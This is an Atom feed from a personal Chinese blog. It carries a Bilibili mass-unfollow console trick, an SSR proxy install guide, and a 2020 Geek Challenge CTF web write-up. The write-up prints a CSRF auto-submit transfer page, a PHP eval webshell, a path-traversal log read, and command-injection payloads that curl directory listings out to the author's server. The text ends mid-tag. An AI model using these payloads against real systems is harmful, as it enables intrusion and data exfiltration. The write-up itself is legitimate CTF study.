<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>W4ke</title>
  
  <subtitle>Welcome to my blog!</subtitle>
  <link href="http://www.w4ke.cn/atom.xml" rel="self"/>
  
  <link href="http://www.w4ke.cn/"/>
  <updated>2022-08-22T09:26:09.019Z</updated>
  <id>http://www.w4ke.cn/</id>
  
  <author>
    <name>W4ke</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>快速删除B站的关注列表</title>
    <link href="http://www.w4ke.cn/2022/08/22/%E5%BF%AB%E9%80%9F%E5%88%A0%E9%99%A4B%E7%AB%99%E7%9A%84%E5%85%B3%E6%B3%A8%E5%88%97%E8%A1%A8/"/>
    <id>http://www.w4ke.cn/2022/08/22/%E5%BF%AB%E9%80%9F%E5%88%A0%E9%99%A4B%E7%AB%99%E7%9A%84%E5%85%B3%E6%B3%A8%E5%88%97%E8%A1%A8/</id>
    <published>2022-08-22T09:25:31.000Z</published>
    <updated>2022-08-22T09:26:09.019Z</updated>
    
    <content type="html"><![CDATA[<h1 id="如何快速删除B站的关注列表"><a href="#如何快速删除B站的关注列表" class="headerlink" title="如何快速删除B站的关注列表"></a>如何快速删除B站的关注列表</h1><p>事情是这样的，三个月前，我的室友嘲笑我B站账号等级低，跟我说<code>当代大学生怎么能不看B站，不会还有人B站才LV4吧？</code></p><p>一气之下我就去github上搜了个<code>B站自动登录</code>，上面能实现B站的<code>自动登录</code>、<code>自动分享</code>，<code>自动点赞</code>这三个功能（也许不止这三个功能但是我只用到了这三个功能）。</p><p>但是，这脚本会自动的帮我关注直播账号并参加<code>天选时刻</code>，也会顺便帮我把up主关注上，久而久之，我的<code>天选时刻</code>列表已经多达629个关注（之前已经删过一批，后面懒的搞了就开摆）。这也就造成我的关注列表比较杂乱，有时候会给我推一些我完全不喜欢的东西，今天就要彻底解决这玩意，做个记录下次还能再使用（毕竟脚本还挂着）。</p><h2 id="1-找到需要删除的列表"><a href="#1-找到需要删除的列表" class="headerlink" title="1.找到需要删除的列表"></a>1.找到需要删除的列表</h2><p><img src="https://files.catbox.moe/8ghwen.png"></p><p>我这边比较特殊，需要删除的只是这个列表里面的所有内容。如果你需要删除的关注都堆在一起，想留下的不想留下的都有，那么首先新建一个列表</p><p><img src="https://files.catbox.moe/4vswsz.png"></p><p><img src="https://files.catbox.moe/szzg4x.png"></p><p>然后点击右上角的按钮，将需要删除的up主一一挪到这个列表中</p><p><img src="attachment:5b7b87f65d82c28c05442e4257d8cb05" alt="截图"></p><p><img src="https://files.catbox.moe/kjvjl2.png"></p><h2 id="2-执行控制台命令"><a href="#2-执行控制台命令" class="headerlink" title="2.执行控制台命令"></a>2.执行控制台命令</h2><p>打开点击键盘的<code>F12</code>键（笔记本可能需要加一个Fn），会出现一个控制台，然后点击<code>Console</code>：</p><p><img src="attachment:abb1614a3e4699d3795c38196de705a2" alt="截图"></p><p>在控制台中输入该命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$(&quot;.be-dropdown-item:contains(&#x27;取消关注&#x27;)&quot;).click()<br></code></pre></td></tr></table></figure><p><img src="https://files.catbox.moe/0qeylk.png"></p><p>然后按一下回车</p><p>可能会弹窗<code>执行失败</code>,这个时候只要刷新一下浏览器就会发现关注列表少了一些</p><p><img src="https://files.catbox.moe/1nbkmz.png"></p><p>每执行一次就刷新一下就OK啦~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;如何快速删除B站的关注列表&quot;&gt;&lt;a href=&quot;#如何快速删除B站的关注列表&quot; class=&quot;headerlink&quot; title=&quot;如何快速删除B站的关注列表&quot;&gt;&lt;/a&gt;如何快速删除B站的关注列表&lt;/h1&gt;&lt;p&gt;事情是这样的，三个月前，我的室友嘲笑我B站账号等级低</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ssr搭建</title>
    <link href="http://www.w4ke.cn/2022/01/12/ssr%E6%90%AD%E5%BB%BA/"/>
    <id>http://www.w4ke.cn/2022/01/12/ssr%E6%90%AD%E5%BB%BA/</id>
    <published>2022-01-12T10:43:35.000Z</published>
    <updated>2022-01-12T11:14:59.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ubuntu一键搭建SSR"><a href="#ubuntu一键搭建SSR" class="headerlink" title="ubuntu一键搭建SSR"></a>ubuntu一键搭建SSR</h1><p><a href="https://github.com/1275178869/ssr">github</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">链接: https://pan.baidu.com/s/1NIELKMYKzl6FGrf_V0JGOQ?pwd=5svz 提取码: 5svz 复制这段内容后打开百度网盘手机App，操作更方便哦<br></code></pre></td></tr></table></figure><p>github或者百度网盘获取sh脚本<br>下载ssr.sh，执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">chmod 777 ssr.sh<br>sudo sh ssr.sh<br></code></pre></td></tr></table></figure><p>接下来根据提示操作即可。</p><h2 id="其他操作指令如下"><a href="#其他操作指令如下" class="headerlink" title="其他操作指令如下"></a>其他操作指令如下</h2><ul><li><p>查看ssr运行状态/配置<br><code>sh ssr.sh info</code></p></li><li><p>更改密码、端口、混淆参数的最简单方法：重新运行一次安装脚本；</p></li><li><p>SSR管理命令：<br>启动:<code>systemctl start shadowsocksR</code><br>停止:<code>systemctl stop shadowsocksR</code><br>重启:<code>systemctl restart shadowsocksR</code></p></li><li><p>卸载SSR<br><code>sh ssr.sh uninstall</code></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ubuntu一键搭建SSR&quot;&gt;&lt;a href=&quot;#ubuntu一键搭建SSR&quot; class=&quot;headerlink&quot; title=&quot;ubuntu一键搭建SSR&quot;&gt;&lt;/a&gt;ubuntu一键搭建SSR&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.co</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2020极客大挑战web部分WriteUp</title>
    <link href="http://www.w4ke.cn/2020/11/22/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98web%E9%83%A8%E5%88%86WriteUp/"/>
    <id>http://www.w4ke.cn/2020/11/22/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98web%E9%83%A8%E5%88%86WriteUp/</id>
    <published>2020-11-22T15:51:29.000Z</published>
    <updated>2021-12-27T15:11:27.862Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WriteUP"><a href="#WriteUP" class="headerlink" title="WriteUP"></a>WriteUP</h1><p>极客要打一个月，本菜鸡就打了前半个月，后半个月因为其（老）他（懒）比（狗）赛（了）就没接着做题，虽然也不一定做得出来，总而言之写一下WriteUp纪念一下。</p><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>题目地址: <code>http://49.234.224.119:8000/</code><br>题目描述： 欢迎来到极客大挑战!</p><p>访问题目链接，发现405报错。<br><img src="https://img-blog.csdnimg.cn/20201019163309981.png?x-oss-process=image" alt="在这里插入图片描述"><br>百度了一下，发现是GET或者POST请求出问题了。拿<code>Postman</code>试一下：<br><img src="https://img-blog.csdnimg.cn/20201019163504865.png?x-oss-process=image" alt="在这里插入图片描述"><br>看了一下需要POST上传一个<code>roam1</code>,<code>roam2</code>,这两个的值不能相等，哈希值要相等，好了，传入数组。<br><img src="https://img-blog.csdnimg.cn/20201019163835109.png?x-oss-process=image" alt="在这里插入图片描述"><br>因为各种哈希都无法对数组进行操作，会返回<code>False</code>。然后又因为<code>False === False </code> =&gt; <code>True</code>，所以顺利绕过~</p><p>在phpinfo里面找找可以利用的信息：<br><img src="https://img-blog.csdnimg.cn/20201019164101789.png?x-oss-process=image" alt="在这里插入图片描述"><br>众所周知，一般的Apache和nginx的根目录是<code>/var/www/html</code>，所以只需要访问<code>http://49.234.224.119:8000/f1444aagggg.php</code>即可。<br>访问结果是这：<br><img src="https://img-blog.csdnimg.cn/2020101916422587.png#pic_center" alt="在这里插入图片描述"><br>其实这是个假页面，是手动写出来的 /捂脸<br>至于为什么，可以随便访问一个不存在的页面：<br><img src="https://img-blog.csdnimg.cn/20201019164355592.png?x-oss-process=image" alt="在这里插入图片描述"><br>下面会出现Apache信息，然鹅flag页面没有，所以真flag肯定藏在页面信息内。<br>找了一圈发现在某个偏僻的角落（网络模块的消息头）：<br><img src="https://img-blog.csdnimg.cn/20201019164611941.png?x-oss-process=image" alt="在这里插入图片描述"><br>出题人真的挺憨批的/我也是真的憨批···</p><hr><h2 id="flagshop"><a href="#flagshop" class="headerlink" title="flagshop"></a>flagshop</h2><p>题目地址: <a href="http://173.82.206.142:8005/">http://173.82.206.142:8005/</a><br>题目描述： 你给我钱,我给你flag,就是这么简单<br>提示：1.No sessionid!Don’t Try to be admin(robot?) 2.Do you know csrf?</p><p>这道题的考点是CSRF，啥是CSRF？<a href="https://blog.csdn.net/xiaoxinshuaiga/article/details/80766369">现场百度</a>。</p><p>看不懂？没事，做完这道题你就懂了。</p><p>首先是个登录界面，测了一下SQL注入没啥鸟用（都提示CSRF了就老老实实注册吧）。<br><img src="https://img-blog.csdnimg.cn/20201019171331977.png?x-oss-process=image" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201019171354671.png#pic_center" alt="在这里插入图片描述"><br>注册完登录以后给我送了11块钱，感动。往下一拉，发现买flag要好多好多钱，瞬间这11块钱就不香了。<br><img src="https://img-blog.csdnimg.cn/20201019171534767.gif#pic_center" alt="在这里插入图片描述"><br>flag商店上面一点点可以看到财（白）富（嫖）榜，好了我们的目标就是这些人了，具体干啥还不知道，先瞄准<code>Longlone</code>从他下手就完事了。</p><p>第二个功能是转账。突然奇思妙想，能不能开个脚本不断注册新用户然后对自己的账户进行转账呢。每次转11块钱？</p><p>翻回去看了一下flag的价格我就停止了这个想法<br><img src="https://img-blog.csdnimg.cn/20201019171956983.png?x-oss-process=image" alt="在这里插入图片描述"><br>1万兆RMB，每次转11元需要转1千兆次，每次2秒钟（就算快一点也要一秒以上）大概等比赛结束还没转完。dbq是我太菜。</p><p>好了不扯了，那这个转账功能干嘛用的呢，猜测是利用某个漏洞，让<code>Longlone</code>这个大（冤）富（大）豪（头）在不知情的状态下给我转账嗷~</p><p>第三个功能是报告，这里还一段戏，重点是<code>我会好好查看你们的报告</code><br><img src="https://img-blog.csdnimg.cn/20201019173804398.png?x-oss-process=image" alt="在这里插入图片描述"><br>好了破案了，提示了CSRF，那就构造一个链接在这里提交，老板在查看报告的时候点一下链接，钱就没啦~</p><p>好了问题来了，怎么构建转账链接呢，代码已写好：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;html&gt;<br>&lt;head&gt;<br>&lt;script&gt;<br>window.onload = function() &#123;<br>  document.getElementById(&quot;postsubmit&quot;).click();<br>&#125;         <br>&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form method=&quot;post&quot; action=&quot;http://173.82.206.142:8005/transfer.php&quot; enctype=&quot;multipart/form-data&quot;&gt;<br>    &lt;input id=&quot;target&quot; type=&quot;text&quot; name=&quot;target&quot; value=&quot;Wake&quot; /&gt;<br>    &lt;input id=&quot;money&quot; type=&quot;text&quot; name=&quot;money&quot; value=&quot;111111111111&quot; /&gt;<br>    &lt;input id=&quot;message&quot; type=&quot;text&quot; name=&quot;messages&quot; value=&quot;hhh&quot; /&gt;<br>        &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>把这个页面挂在某个服务器上，然后把访问这个网页的链接提交到报告里面就好啦！</p><p>服务器干嘛用呢，这里主要涉及到公网和内网的知识点。一般的机子都是处于一个局域网下，没有一个固定的公网ip，非局域网下的用户没办法访问你的ip，所以就需要一个公网ip。</p><p>一般来说个人是没有公网ip的，如果想要的话可以去租个云服务器，或者利用内网穿透将自己的一些端口映射出去即可。</p><p>这里采用将恶意网页挂在云服务器上，构造的结果是<code>111.229.xxx.17/aaa.html</code>(菜鸡选择不暴露自己的ip免得被日穿)</p><p>然后发现这里需要输入一个验证码，md5哈希值的前五位有要求。然后写了个代码爆破一下：<br><img src="https://img-blog.csdnimg.cn/20201019211659289.png#pic_center" alt="z"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#coding:utf-8<br>#python3<br>import hashlib<br>import time<br><br>t = time.time()<br>l = &#x27;qwertyuiopasdfghjklzxcvbnm&#x27;<br>for i in l:<br>    for j in l:<br>        for k in l:<br>            for m in l:<br>                for n in l:<br>                    for o in l:<br>                        f = i + j + k + m + n + o <br>                        md5 =  hashlib.md5(f.encode(encoding=&#x27;UTF-8&#x27;)).hexdigest()<br>                        if md5[:5] == &#x27;f34c3&#x27;:<br>                            print(f)<br>                            print(md5)<br>                            print(time.time()-t)<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201019211749853.png#pic_center" alt="在这里插入图片描述"><br>很快就爆出了两个<br><img src="https://img-blog.csdnimg.cn/20201019211839255.png?x-oss-process=image" alt="在这里插入图片描述"><br>然后提交一下：<br><img src="https://img-blog.csdnimg.cn/20201019211857276.png#pic_center" alt="在这里插入图片描述"><br>去主页看看：<br><img src="https://img-blog.csdnimg.cn/20201019211913823.png?x-oss-process=image" alt="在这里插入图片描述"><br>然后买一下flag就搞定啦~</p><hr><h2 id="朋友的学妹"><a href="#朋友的学妹" class="headerlink" title="朋友的学妹"></a>朋友的学妹</h2><p>题目地址:<a href="http://49.234.224.119:7413/">http://49.234.224.119:7413/</a><br>题目描述:与妹子单独相处一会儿吧</p><p>没啥好说的，右键查看源码出flag</p><hr><h2 id="EZwww"><a href="#EZwww" class="headerlink" title="EZwww"></a>EZwww</h2><p>题目地址:<a href="http://47.100.46.169:3901/">http://47.100.46.169:3901/</a><br>题目描述:备份是个好习惯</p><p>试了试<code>www.zip</code>，就下载下来了附件。<br><img src="https://img-blog.csdnimg.cn/20201019212914760.png#pic_center" alt="在这里插入图片描述"><br>这里有个假flag。</p><p>打开<code>index.php</code>，看到源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;html&gt;<br> &lt;head&gt;<br>  &lt;title&gt;Lola&#x27;s website1.0&lt;/title&gt;<br> &lt;/head&gt;<br> &lt;body&gt;<br> &lt;?php echo &#x27;&lt;h1&gt;welcome to my website&lt;/h1&gt;&#x27;; ?&gt;<br> &lt;?php echo &#x27;&lt;p&gt;i will never forget to backup my website......&lt;/p&gt;&#x27;; ?&gt;<br> &lt;?php echo &#x27;&lt;img src=&quot;img/lola.gif&quot; alt=&quot;welcome~&quot;/&gt;&#x27;; ?&gt;<br> &lt;/body&gt;<br>&lt;/html&gt;<br>&lt;?php<br>$key1 = $_POST[&#x27;a&#x27;];<br>$key2 = base64_decode(&#x27;c3ljbDB2ZXI=&#x27;);<br>if($key1 === $key2)<br>&#123;<br>    //this is a true flag<br>echo &#x27;&lt;p&gt;SYC&#123;xxxxxxxxxxxxxxxxxx&#125;&lt;/p&gt;&#x27;;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>key2的结果是<code>sycl0ver</code>。<br><img src="https://img-blog.csdnimg.cn/20201019213058209.png#pic_center" alt="在这里插入图片描述"><br>传一个上去：<br><img src="https://img-blog.csdnimg.cn/20201019213301265.png?x-oss-process=image" alt="在这里插入图片描述"></p><hr><h2 id="EZgit"><a href="#EZgit" class="headerlink" title="EZgit"></a>EZgit</h2><p>题目地址:<a href="http://47.100.46.169:3902/">http://47.100.46.169:3902/</a><br>题目描述:当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,嘿嘿嘿。。。</p><p>提示git了，先访问<code>http://47.100.46.169:3902/.git</code><br><img src="https://img-blog.csdnimg.cn/20201020101239157.png?x-oss-process=image" alt="在这里插入图片描述"><br>好了，git源码泄露。</p><p>githack上线：<a href="https://github.com/BugScanTeam/GitHack">传送门</a></p><p>下载下来以后解压，在当前目录打开cmd：</p><p><img src="https://img-blog.csdnimg.cn/20201020101500452.png?x-oss-process=image" alt="在这里插入图片描述"><br><del>等两分钟左右</del> 要好久<br><img src="https://img-blog.csdnimg.cn/20201020102920401.png?x-oss-process=image" alt="在这里插入图片描述"><br>在dist下有一个目录，就是刚才githack攻击的结果。<br><img src="https://img-blog.csdnimg.cn/2020102011104842.png#pic_center" alt="在这里插入图片描述"><br>打开之后flag居然过期了：<br><img src="https://img-blog.csdnimg.cn/2020102011110990.png#pic_center" alt="在这里插入图片描述"><br>然后理一遍思路：<br>git是用来这里版本信息的，这里表示版本过期了，那就需要更新一下版本。</p><p>可以使用<code>git log -p</code> 查看git所有的日志，一目了然。也可以用git更新一下<code>fl4g.php</code>，flag也会在里面。（前提是要装git，安装过程自行<a href="https://www.baidu.com/">百度</a>~）</p><p><img src="https://img-blog.csdnimg.cn/20201020111511757.png?x-oss-process=image" alt="在这里插入图片描述"></p><hr><h2 id="刘壮的黑页"><a href="#刘壮的黑页" class="headerlink" title="刘壮的黑页"></a>刘壮的黑页</h2><p>题目地址：<a href="http://106.54.75.217:8080/">http://106.54.75.217:8080/</a></p><p>打开之后再页面底下有源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>include(&quot;flag.php&quot;);<br>highlight_file(__FILE__);<br>$username = $_GET[&#x27;username&#x27;];<br>$passwd = $_POST[&#x27;passwd&#x27;];<br>if ($username === &#x27;admin&#x27; &amp;&amp; $passwd === &#x27;syclover&#x27;) &#123;<br>    echo $flag;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后GET传一个username=admin,POST传一个passwd=syclover就出flag了。</p><hr><h2 id="我是大黑客"><a href="#我是大黑客" class="headerlink" title="我是大黑客"></a>我是大黑客</h2><p>点开链接，直接说明有一个<code>liuzhuang.php.bak</code>，访问一下：<br><img src="https://img-blog.csdnimg.cn/20201020115854987.png?x-oss-process=image" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201020120011524.png?x-oss-process=image" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>eval($_POST[&#x27;liuzhuang&#x27;]);<br><br>//谁是大恶人 那必定是我liuzhuang<br>//当你的服务器看到 0xliuzhuang 就知道要买台新机器了<br>?&gt;<br></code></pre></td></tr></table></figure><p>明显的一句话木马，连一下：</p><p><img src="https://img-blog.csdnimg.cn/20201020120134524.png?x-oss-process=image" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201020120155719.png?x-oss-process=image" alt="在这里插入图片描述"><br>连上了，根目录下有flag：<br><img src="https://img-blog.csdnimg.cn/20201020120236929.png?x-oss-process=image" alt="在这里插入图片描述"></p><hr><h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><p>打开链接，要求的上传一个a和一个b，必须满足两个条件：</p><ul><li>a和b的strcmp结果要为NULL</li><li>a和b不能相等<br><img src="https://img-blog.csdnimg.cn/20201020120313555.png?x-oss-process=image" alt="在这里插入图片描述"><br>利用数组绕过。<br><img src="https://img-blog.csdnimg.cn/20201020120513602.png#pic_center" alt="在这里插入图片描述"><br>这里又要求post传一个c要等于123但是又不能是数字，那就传一个<code>123qwe</code><br>123后面加一些字母/字符就行。<br><img src="https://img-blog.csdnimg.cn/20201020120626948.png?x-oss-process=image" alt="在这里插入图片描述"></li></ul><hr><h2 id="知X堂的php教程"><a href="#知X堂的php教程" class="headerlink" title="知X堂的php教程"></a>知X堂的php教程</h2><p>题目地址:<a href="http://47.94.239.194:8082/">http://47.94.239.194:8082/</a><br>题目描述:知X堂（PS:请勿对号入座）的php教程开课啦！ん？好像不太对劲？</p><p>进去之后有一个可以点的链接，先点一下：<br><img src="https://img-blog.csdnimg.cn/20201020120852715.png?x-oss-process=image" alt="在这里插入图片描述"><br>然后这个url有点奇怪：<br><img src="https://img-blog.csdnimg.cn/20201020120905534.png?x-oss-process=image" alt="在这里插入图片描述"><br>listdir是列出目录下所有文件的意思，那这个php的功能是不是传入一个目录地址可以列出来呢？</p><p>是的，但是不全（为什么不全后面会讲）。</p><p>这里列出了一个flag.php，点一下：<br><img src="https://img-blog.csdnimg.cn/20201020121543529.png?x-oss-process=image" alt="在这里插入图片描述"><br>虽然是flag.php但是一点诚意都没有，因为这里并没有include其他php，所以就算达成条件也输不出flag。</p><p>然后，嗯？这个链接构造有点意思，居然先访问的<code>displaySourceCode.php</code><br>咦，难不成这个东西可以直接显示所有文件的内容？试着包含自己<br><img src="https://img-blog.csdnimg.cn/20201020122007480.png?x-oss-process=image" alt="在这里插入图片描述"><br>哦豁，确实可以读取所有东西。</p><p>然后，<font color='red' size='6'>这里出现了一个非预期</font></p><p>我读取了一下日志文件<img src="https://img-blog.csdnimg.cn/20201020122220105.jpg#pic_center" alt="在这里插入图片描述"><br>直接看到了大佬的payload，然后回头试了一下就干进去了。<br>payload是这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://47.94.239.194:8082/displaySourceCode.php?phpfile=../../../../var/log/nginx/access.log<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201020122417244.png?x-oss-process=image" alt="在这里插入图片描述"><br>就在我这么”做出来”的一小时以后，发现这个payload已经不能用了（估计管理员已经将这个文件设置成700权限了吧），Guest用户不可见，还好我机智没把这个页面关掉，这才有了这张截图。把这个payload打一下，直接出flag：<br><img src="https://img-blog.csdnimg.cn/20201020122631348.png#pic_center" alt="在这里插入图片描述"></p><p>憨批操作到此为止，接下来上干货，正规解法来了（虽然不知道这个解法会不会也是非预期）！</p><p>首先读取一下listdir.php<br><img src="https://img-blog.csdnimg.cn/20201020123103962.png?x-oss-process=image" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php<br>include(&quot;waf.php&quot;);<br><br>// 设置目录名称并进行扫描。<br>$search_dir = $_GET[&#x27;dirname&#x27;];<br>$title = &quot;教案&quot;;<br><br>// 防止命令注入<br>$search_dir = shellWaf($search_dir);<br><br>//$contents = scandir($search_dir); 或者使用<br>exec(&quot;ls $search_dir&quot;, $contents);<br></code></pre></td></tr></table></figure><p>重点部分代码是这块，这里使用<code>exec</code>执行这个命令，而这个语句里面的<code>search_dir</code>是可控的，但是会被waf.php过滤掉一部分，那就去看看waf过滤了啥。<br><img src="https://img-blog.csdnimg.cn/20201020123442184.png?x-oss-process=image" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br>&lt;?php<br><br>// 防御XSS<br>function html($string) &#123;<br>return htmlspecialchars($string);<br>&#125;<br><br>// 防御命令注入<br>function shellWaf($string) &#123;<br>return preg_replace(&quot;/(&amp;)|(\|)|(&gt;)|(&lt;)/i&quot;, &quot;&quot;, $string);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其实就过滤了<code>&amp;</code> <code>|</code> <code>&gt;</code> <code>&lt;</code>，那就试着利用分号来进行RCE：<br>举个栗子，我们上传<code>/;echo Wake</code>，那么在PHP里面出来的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ls /;echo Wake<br></code></pre></td></tr></table></figure><p>看看linux下的执行结果：<br><img src="https://img-blog.csdnimg.cn/20201020123855904.png#pic_center" alt="在这里插入图片描述"><br>其实就是两条命令一起执行了！好了，漏洞已经找到，搞就完事了。</p><p>前面已经说了    <code>listdir.php</code>    是列出文件的东西，传一个<code>/</code>构造一下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ls /<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201020124331451.png?x-oss-process=image" alt="在这里插入图片描述"><br>只显示了一个<code>start.sh</code></p><p>讲道理的话，根目录下肯定有一堆<code>bin</code> <code>boot</code>等一堆文件夹，然鹅这里没有显示出来，不讲道理，看看源码：<br><img src="https://img-blog.csdnimg.cn/20201020124649604.png#pic_center" alt="在这里插入图片描述"><br>这里的<code>is_file</code>只显示常规文件，不显示文件夹和非常规文件。那只能想其他办法获取这个内容了，盲猜flag就在根目录下。</p><p>这里介绍一下<code>nc</code>，一个被称为<code>瑞士军刀</code>的linux小工具。<a href="https://www.jianshu.com/p/8aaf3cd101f8">参考链接</a><br><img src="https://img-blog.csdnimg.cn/20201020125012294.png?x-oss-process=image" alt="在这里插入图片描述"><br>比如在服务器上开一个nc服务：<br><img src="https://img-blog.csdnimg.cn/20201020125139169.png#pic_center" alt="在这里插入图片描述"><br>然后访问一下<img src="https://img-blog.csdnimg.cn/20201020125228730.png#pic_center" alt="在这里插入图片描述"><br>发现可以在服务器端看到传了些啥<br><img src="https://img-blog.csdnimg.cn/20201020125251425.png#pic_center" alt="在这里插入图片描述"><br>实用工具介绍完毕，开始干活。众所周知Linux向网页发起请求使用的是<code>curl</code>，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">curl 111.229.xxx.17:1234?hello=qwe<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020102012574678.png?x-oss-process=image" alt="在这里插入图片描述"><br>下面这台机子向上面那台服务器发起请求，可以接到。利用这个来搞事情~<br>构造出来一个payload：（虽然这么构造但是我们不上传前面那个ls，那个ls是php内置的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ls /;curl 111.229.xxx.17:1234?hello=`ls /`<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201020130110127.png?x-oss-process=image" alt="在这里插入图片描述"><br>服务器端收到了一个<code>bin</code><br><img src="https://img-blog.csdnimg.cn/20201020130210121.png#pic_center" alt="在这里插入图片描述"><br>看来是分号将请求截断了，可以用base64绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ls /;curl 111.229.xxx.17:1234?hello=`ls /|base64`<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020102013064994.png#pic_center" alt="在这里插入图片描述"><br>这里的<code>|base64</code>是将前面的结果进行base64编码<br><img src="https://img-blog.csdnimg.cn/20201020130802563.png?x-oss-process=image" alt="在这里插入图片描述"><br>但是考虑到waf过滤了<code>|</code>，于是用php套娃。</p><p>构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ls /;php -r &#x27;system(base64_decode(&quot;Y3VybCAxMTEuMjI5Lnh4eC4xNzoxMjM0P2hlbGxvPWBscyAvfGJhc2U2NGA=&quot;));&#x27;<br></code></pre></td></tr></table></figure><p><img 